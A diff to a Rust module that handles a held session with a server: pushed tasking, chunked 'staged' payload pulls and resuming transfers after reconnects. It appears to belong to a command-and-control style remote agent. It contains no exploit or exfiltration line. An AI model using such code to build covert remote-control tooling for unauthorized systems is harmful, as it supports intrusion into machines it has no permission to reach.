@@ -2,7 +2,7 @@ use prost::Message;
 
 use crate::error::ContactError;
 use crate::session::Session;
-use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, StagedPull, TaskRequest};
+use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, TaskRequest};
 
 // The held live session, shared by the stream transports (architecture.md
 // Sec 8): after the opening handshake exchange the server pushes tasking the
@@ -31,7 +31,9 @@ pub(crate) trait LiveChannel {
 /// The held handshake arc both stream carriages run after their socket opens:
 /// write the handshake, answer-refusal short-circuits, results whose delivery
 /// may have died with an earlier connection ride first (the server records
-/// first-wins), then the held loop takes over the answer's remaining frames.
+/// first-wins), staged transfers left pending by a dropped connection
+/// re-drive from their held seams (an acked task never redelivers), then the
+/// held loop takes over the answer's remaining frames.
 pub(crate) fn held_handshake(
     session: &mut Session,
     channel: &mut dyn LiveChannel,
@@ -39,15 +41,16 @@ pub(crate) fn held_handshake(
     acks: bool,
 ) -> Result<(), ContactError> {
     flush(channel, session)?;
+    run_staged(session, channel)?;
     serve_held(session, channel, inbound, acks)?;
     serve_loop(session, channel, acks)
 }
 
 /// One message's held frames: channel input routes to the live channel it
-/// names, a staged task pulls its payload inline (the blocking exchange the
-/// held connection permits), tasking is accepted and flushed the moment it
-/// happens. Downstream frames discriminate on kind first -- the positional
-/// tasking parse is for kindless frames alone.
+/// names, a staged task registers its transfer and pulls inline (the
+/// blocking exchange the held connection permits), tasking is accepted and
+/// flushed the moment it happens. Downstream frames discriminate on kind
+/// first -- the positional tasking parse is for kindless frames alone.
 pub(crate) fn serve_held(
     session: &mut Session,
     channel: &mut dyn LiveChannel,
@@ -65,12 +68,15 @@ pub(crate) fn serve_held(
             continue;
         }
         if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
-            if task.staged_bytes.is_some() {
-                run_staged(session, channel, &task)?;
-            } else {
-                session.accept(&task, acks);
-                flush(channel, session)?;
+            let staged = task.staged_bytes.is_some();
+            session.accept(&task, acks);
+            if staged && session.staged_holds(&task.task_id) {
+                // A verified staged task: pull the payload over this
+                // connection before anything else -- the verb cannot run
+                // without it, and the demand is answered inline.
+                run_staged(session, channel)?;
             }
+            flush(channel, session)?;
         }
     }
     Ok(())
@@ -94,48 +100,39 @@ pub(crate) fn serve_loop(
     }
 }
 
-/// The staged arm on the held connection: demand the payload, then block on
-/// the messages until its terminal chunk -- nothing else interleaves on a
-/// blocking read.
+/// The staged arm on the held connection: every pending transfer demands at
+/// its current seam and blocks on the messages until its terminal chunk --
+/// nothing else interleaves on a blocking read. The held bytes live on the
+/// session, so a connection that dies mid-run loses nothing: the reconnect
+/// re-drives the transfers from what is held, and an acked staged task never
+/// redelivers, so the drive is the carriage's own duty.
 pub(crate) fn run_staged(
     session: &mut Session,
     channel: &mut dyn LiveChannel,
-    task: &TaskRequest,
 ) -> Result<(), ContactError> {
-    let demand = [Frame {
-        payload: StagedPull {
-            task_id: task.task_id.clone(),
-        }
-        .encode_to_vec(),
-        kind: FrameKind::StagedPull as i32,
-    }];
-    channel.send_batch(session, &demand)?;
+    while let Some(task_id) = session.staged_pending().first().cloned() {
+        let demand = [session
+            .staged_pull_frame(&task_id)
+            .expect("the pending transfer builds its demand")];
+        channel.send_batch(session, &demand)?;
 
-    let mut payload: Vec<u8> = Vec::new();
-    loop {
-        // An idle tick while the payload parks is a tick, not a close: keep
-        // waiting (the stream carriage's own staged arm waited the same way).
-        let Some(frames) = channel.recv(session)? else {
-            continue;
-        };
-        for frame in frames {
-            if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
-                if chunk.task_id == task.task_id {
-                    payload.extend_from_slice(&chunk.data);
-                    if chunk.terminal {
-                        let (outcome, output) = super::http::dispatch_staged(
-                            session,
-                            &task.verb,
-                            &task.arguments,
-                            &payload,
-                        );
-                        session.outbox.result(&task.task_id, outcome, &output);
-                        return Ok(());
-                    }
+        loop {
+            // An idle tick while the payload parks is a tick, not a close: keep
+            // waiting (the stream carriage's own staged arm waited the same way).
+            let Some(frames) = channel.recv(session)? else {
+                continue;
+            };
+            for frame in frames {
+                if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
+                    session.accept_staged_chunk(&chunk);
                 }
+            }
+            if !session.staged_holds(&task_id) {
+                break; // the terminal chunk dispatched the task
             }
         }
     }
+    Ok(())
 }
 
 /// Writes whatever the session has queued since the last write, marking it
